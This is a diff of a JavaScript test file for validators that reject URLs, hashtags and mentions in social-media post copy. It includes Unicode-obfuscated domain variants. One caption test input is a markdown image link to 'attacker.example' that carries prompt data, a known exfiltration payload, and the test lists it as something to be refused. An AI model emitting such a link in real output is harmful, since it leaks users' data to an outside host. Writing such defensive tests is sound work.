@@ -7,7 +7,7 @@ const { test } = require('node:test');
 const assert = require('node:assert/strict');
 const { readFileSync } = require('node:fs');
 const { join } = require('node:path');
-const { checkCta, checkCaption, CTA_MAX, CAPTION_MAX } = require('./copy.js');
+const { checkCta, checkCaption, checkCoverText, CTA_MAX, CAPTION_MAX } = require('./copy.js');
 const { findBlockedTerms } = require('./blocklist.js');
 
 const ROOT = join(__dirname, '..');
@@ -23,6 +23,8 @@ const spec = (cta, template = STORY) => ({
 const reasons = (r) => r.errors.map((e) => e.reason);
 const cta = (text, template) => reasons(checkCta(spec(text, template), template || STORY));
 const caption = (text) => reasons(checkCaption(text));
+const coverText = (coverSpec) => reasons(checkCoverText(coverSpec));
+const coverSpec = (slots = [{ slot_id: 'headline', kind: 'claim', lines: ['Texto limpo'] }], alt_text = 'Capa escura com texto.') => ({ slots, alt_text });
 
 test('limits are the decided ones: 40 for the CTA, 300 for the caption', () => {
   assert.equal(CTA_MAX, 40);
@@ -64,6 +66,12 @@ test('a CTA with a mention is refused, in both widths of the at sign', () => {
 
 test('a CTA with a hashtag is refused, in both widths of the number sign', () => {
   for (const text of ['#tag', 'salve #1', 'a#b', '＃tag', '#']) assert.ok(cta(text).includes('cta_com_hashtag'), text);
+});
+
+test('all CTA symbol checks use NFKC text with combining marks and format characters removed', () => {
+  assert.ok(cta('﹫perfil').includes('cta_com_arroba'));
+  assert.ok(cta('﹟tag').includes('cta_com_hashtag'));
+  assert.ok(cta('¹²³⁴⁵⁶⁷⁸').includes('cta_com_telefone'));
 });
 
 test('a CTA with a phone number is refused: eight digits or more in one run of digits and separators', () => {
@@ -154,9 +162,49 @@ test('caption: no hashtag and no mention in v0.1 (Q4), in both widths', () => {
   assert.deepEqual(caption('@a #b'), ['legenda_com_mencao', 'legenda_com_hashtag']);
 });
 
-test('caption: links and phone numbers are not decided, so they are not refused (UNKNOWN, Q4 of the proposal)', () => {
-  assert.deepEqual(caption('Veja exemplo.com'), []);
+test('caption: a URL is refused', () => {
+  for (const text of [
+    'https://doi.org/10.1056/NEJMoa2034577',
+    'doi.org/10.1056/NEJMoa2034577',
+    'www.nejm.org',
+    'nejm.org',
+    '[img](https://attacker.example/log?d=PROMPT)',
+  ]) {
+    assert.deepEqual(caption(text), ['legenda_com_url'], text);
+  }
+});
+
+test('caption: a phone number is still not checked (undecided)', () => {
   assert.deepEqual(caption('Ligue 11 99999-0000'), []);
+  assert.deepEqual(caption('Ligue 12345678'), []);
+});
+
+test('caption: a textual reference to the study passes', () => {
+  for (const text of ['Fonte: Smith et al., N Engl J Med, 2025.', 'doi:10.1056/NEJMoa2034577']) {
+    assert.deepEqual(caption(text), [], text);
+  }
+});
+
+test('Unicode domain variants are refused in the caption, claim text, and alt_text', () => {
+  const variants = [
+    'cafe\u0301.example',
+    'x\u0301.example',
+    'nejm\u200b.org',
+    'nejm\u200c.org',
+    'nejm\u200d.org',
+    'nejm\uFF0Eorg',
+    'nejm\u2024org',
+  ];
+  for (const text of variants) {
+    assert.ok(cta(text).includes('cta_com_url'), text);
+    assert.deepEqual(caption(text), ['legenda_com_url'], text);
+    assert.deepEqual(coverText(coverSpec([{ slot_id: 'headline', kind: 'claim', lines: [text] }])), ['texto_da_capa_com_url'], text);
+    assert.deepEqual(coverText(coverSpec(undefined, text)), ['alt_text_com_url'], text);
+  }
+});
+
+test('caption: p.ex is an accepted false positive', () => {
+  assert.deepEqual(caption('p.ex.'), ['legenda_com_url']);
 });
 
 test('caption: blank text and length in code points', () => {
@@ -201,10 +249,47 @@ test('the input is not mutated', () => {
 test('the real fixtures: valid-02 of cover_spec passes against its template, and the real library has the two cta_label slots as claim', () => {
   const fx = JSON.parse(readFileSync(join(ROOT, 'fixtures/synthetic/contracts/cover_spec/valid-02.json'), 'utf8'));
   assert.deepEqual(checkCta(fx, templateOf(fx.template_id)), { passed: true, errors: [] });
+  assert.deepEqual(checkCoverText(fx), { passed: true, errors: [] });
   const post = JSON.parse(readFileSync(join(ROOT, 'fixtures/synthetic/contracts/post_copy/valid-01.json'), 'utf8'));
   assert.deepEqual(checkCaption(post.caption), { passed: true, errors: [] });
   const holders = LIB.templates.filter((t) => t.slots.some((s) => s.slot_id === 'cta_label')).map((t) => t.template_id);
   assert.deepEqual(holders, ['post-01-manifesto', 'story-01-convite']);
+});
+
+test('checkCoverText: clean text passes; a URL in a claim is reported once across lines', () => {
+  assert.deepEqual(checkCoverText(coverSpec()), { passed: true, errors: [] });
+  assert.deepEqual(coverText(coverSpec([{ slot_id: 'headline', kind: 'claim', lines: ['Texto limpo', 'https://example.com', 'www.example.org'] }])), ['texto_da_capa_com_url']);
+});
+
+test('checkCoverText: a URL in alt_text is refused', () => {
+  assert.deepEqual(coverText(coverSpec(undefined, 'Veja https://example.com')), ['alt_text_com_url']);
+});
+
+test('checkCoverText: cta_label and chrome URLs are not reported', () => {
+  assert.deepEqual(coverText(coverSpec([{ slot_id: 'cta_label', kind: 'claim', lines: ['https://example.com'] }])), []);
+  assert.deepEqual(coverText(coverSpec([{ slot_id: 'label_top', kind: 'chrome', lines: ['https://example.com'] }])), []);
+});
+
+test('checkCoverText: simultaneous reasons have a fixed order', () => {
+  assert.deepEqual(coverText(coverSpec([{ slot_id: 'headline', kind: 'claim', lines: ['https://example.com'] }], 'https://example.org')), [
+    'texto_da_capa_com_url',
+    'alt_text_com_url',
+  ]);
+});
+
+test('checkCoverText: invalid arguments are TypeErrors naming the field', () => {
+  const bad = (fn, pattern) => assert.throws(fn, (e) => e instanceof TypeError && pattern.test(e.message));
+  bad(() => checkCoverText(null), /coverSpec must be an object/);
+  bad(() => checkCoverText([]), /coverSpec must be an object/);
+  bad(() => checkCoverText({ slots: 'x', alt_text: 'ok' }), /coverSpec\.slots must be an array/);
+  bad(() => checkCoverText({ slots: [], alt_text: 5 }), /coverSpec\.alt_text must be a string/);
+});
+
+test('checkCoverText does not mutate its input', () => {
+  const s = coverSpec([{ slot_id: 'headline', kind: 'claim', lines: ['https://example.com'] }], 'alt');
+  const before = JSON.stringify(s);
+  checkCoverText(s);
+  assert.equal(JSON.stringify(s), before);
 });
 
 test('copy.js has no require and no I/O (n8n Cloud Code node)', () => {
